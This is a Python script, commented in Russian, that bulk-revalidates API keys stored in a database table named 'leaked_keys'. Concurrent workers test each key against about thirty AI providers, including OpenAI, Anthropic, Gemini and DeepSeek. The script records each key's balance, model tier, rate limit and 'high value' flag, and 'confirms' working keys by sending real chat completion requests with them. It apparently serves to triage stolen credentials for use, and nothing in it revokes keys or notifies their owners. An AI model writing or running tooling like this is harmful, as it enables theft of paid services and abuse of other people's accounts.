#!/usr/bin/env python3
"""
Финальная перепроверка всех ключей:
1. Силовая нормализация base_url → канонический эндпоинт
2. Повторная валидация каждого ключа на НОВОМ эндпоинте
3. Если ключ работал на старом, но не на новом → попробовать fallback
4. Тестирование моделей только для валидных ключей

Запуск:
    python revalidate_all.py [--limit N] [--workers W]
"""
import argparse
import asyncio
import os
import sys
import time
from datetime import datetime
from types import SimpleNamespace
from typing import Dict, List

from loguru import logger

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from database import Database, KeyStatus, normalize_base_url
from validator import AsyncValidator
from config import config


def _build_scan_result(key_row: dict) -> object:
    return SimpleNamespace(
        platform=key_row.get("platform", ""),
        api_key=key_row.get("api_key", ""),
        base_url=key_row.get("base_url", ""),
        source_url=key_row.get("source_url", ""),
        is_azure=key_row.get("platform", "").lower() == "azure",
    )


async def _worker(
    validator: AsyncValidator,
    db: Database,
    rows: List[dict],
    stats: dict,
    semaphore: asyncio.Semaphore,
    progress: dict,
):
    for key_row in rows:
        if progress["cancelled"]:
            break
        async with semaphore:
            progress["done"] += 1
            idx = progress["done"]
            # Прогресс для дашборда TUI (если задача запущена из TUI)
            try:
                from tui_app import _set_task_progress
                _set_task_progress(progress.get("task_type", "full_revalidate"),
                                   progress["done"], progress["total"])
            except Exception:
                pass
            try:
                result = _build_scan_result(key_row)
                old_url = key_row.get("base_url", "")
                masked = result.api_key[:8] + "..." if len(result.api_key) > 10 else result.api_key
                if idx % 100 == 0:
                    elapsed = time.time() - progress["start"]
                    rate = progress["done"] / elapsed if elapsed > 0 else 0
                    logger.info(
                        f"[{progress['done']}/{progress['total']}] "
                        f"({rate:.1f}/s, {elapsed:.0f}s elapsed)")

                new_url = normalize_base_url(old_url)
                result.base_url = new_url

                # Валидация на каноническом эндпоинте
                vr = await validator.validate_single(result)

                # Если FAILED на каноническом — попробовать оригинальный URL
                if vr.status in (KeyStatus.CONNECTION_ERROR, KeyStatus.INVALID) and new_url != old_url:
                    result.base_url = old_url
                    vr2 = await validator.validate_single(result)
                    # Если на оригинале был лучше — используем его
                    if _status_rank(vr2.status) > _status_rank(vr.status):
                        vr = vr2
                        new_url = old_url

                balance_str = ""
                if vr.balance_usd and vr.balance_usd > 0:
                    balance_str = f"${vr.balance_usd:.2f}"

                db.update_key_status(
                    result.api_key,
                    status=vr.status,
                    balance=balance_str,
                    model_tier=vr.model_tier,
                    rpm=vr.rpm,
                    is_high_value=vr.is_high_value,
                )

                if new_url != old_url:
                    with db._get_connection() as conn:
                        conn.execute(
                            "UPDATE leaked_keys SET base_url = ? WHERE api_key = ?",
                            (new_url, result.api_key))

                # Сохранить модели
                if vr.status in (KeyStatus.VALID, KeyStatus.CONFIRMED) and vr.models:
                    db.save_key_models(result.api_key, vr.models)

                # CONFIRMED: реальный chat completion запрос
                confirm_platforms = {
                    'openai', 'relay', 'xai', 'openrouter', 'cerebras', 'groq',
                    'deepseek', 'perplexity', 'together', 'mistral', 'fireworks',
                    'moonshot', 'siliconflow', 'dashscope', 'anthropic',
                    'gemini', 'huggingface', 'replicate', 'cohere', 'anyscale',
                    'lepton', 'jina', 'voyage', 'zhipu', 'yi', 'baichuan',
                    'stepfun', 'minimax', 'internlm', 'volcengine',
                }
                if vr.status == KeyStatus.VALID and result.platform.lower() in confirm_platforms:
                    try:
                        confirmed = await validator.confirm_key(
                            result.api_key, result.base_url, vr.models,
                            platform=result.platform)
                        if confirmed.status == KeyStatus.VALID and "Подтверждён" in confirmed.info:
                            db.update_key_status(
                                result.api_key, KeyStatus.CONFIRMED,
                                balance=balance_str,
                                model_tier=vr.model_tier, rpm=vr.rpm,
                                is_high_value=vr.is_high_value)
                            vr.status = KeyStatus.CONFIRMED
                            if idx % 50 == 0:
                                logger.info(f"  ✓✓ CONFIRMED {result.api_key[:8]}...: {confirmed.info[:40]}")
                    except Exception as e:
                        logger.debug(f"confirm error: {e}")

                # Модели уже проверены и помечены внутри confirm_key выше
                # (mark_models_confirmed_batch). confirm_models удалён — дублировал.

                st = vr.status.value
                stats[st] = stats.get(st, 0) + 1

            except Exception as e:
                logger.debug(f"Error {key_row.get('api_key','')[:12]}: {e}")
                stats["error"] = stats.get("error", 0) + 1


def _status_rank(s: KeyStatus) -> int:
    """Чем выше ранг — тем лучше статус."""
    return {
        KeyStatus.CONFIRMED: 6,
        KeyStatus.VALID: 5,
        KeyStatus.QUOTA_EXCEEDED: 4,
        KeyStatus.UNVERIFIED: 3,
        KeyStatus.CONNECTION_ERROR: 2,
        KeyStatus.INVALID: 1,
        KeyStatus.PENDING: 0,
    }.get(s, 0)


async def revalidate_all(db: Database, limit: int = 0, workers: int = 40,
                         task_type: str = "full_revalidate"):
    validator = AsyncValidator(db)
    validator._circuit_breaker.reset()

    # Получить ВСЕ ключи (кроме invalid — они точно невалидны)
    sql = ("SELECT * FROM leaked_keys WHERE status != 'invalid' ORDER BY id")
    if limit:
        sql += f" LIMIT {limit}"
    with db._get_connection() as conn:
        rows = [dict(r) for r in conn.execute(sql).fetchall()]

    logger.info(f"Ключей для перепроверки: {len(rows)}")
    if not rows:
        return

    stats = {"total": len(rows), "confirmed": 0, "valid": 0, "invalid": 0,
             "quota": 0, "connection_error": 0, "unverified": 0, "pending": 0, "error": 0}
    progress = {"done": 0, "total": len(rows), "start": time.time(),
                "cancelled": False, "task_type": task_type}
    try:
        from tui_app import _set_task_progress
        _set_task_progress(task_type, 0, len(rows))
    except Exception:
        pass

    semaphore = asyncio.Semaphore(workers)
    batch_size = max(1, len(rows) // workers)
    batches = [rows[i:i+batch_size] for i in range(0, len(rows), batch_size)]

    tasks = [
        asyncio.create_task(
            _worker(validator, db, batch, stats, semaphore, progress))
        for batch in batches
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - progress["start"]
    logger.info(f"=== Готово за {elapsed:.0f}s ===")
    for k, v in sorted(stats.items()):
        if k != "total" and v:
            logger.info(f"  {k}: {v}")
    try:
        from tui_app import _clear_task_progress
        _clear_task_progress(task_type)
    except Exception:
        pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--workers", type=int, default=40)
    args = parser.parse_args()
    db = Database(config.db_path)
    asyncio.run(revalidate_all(db, args.limit, args.workers))


if __name__ == "__main__":
    main()
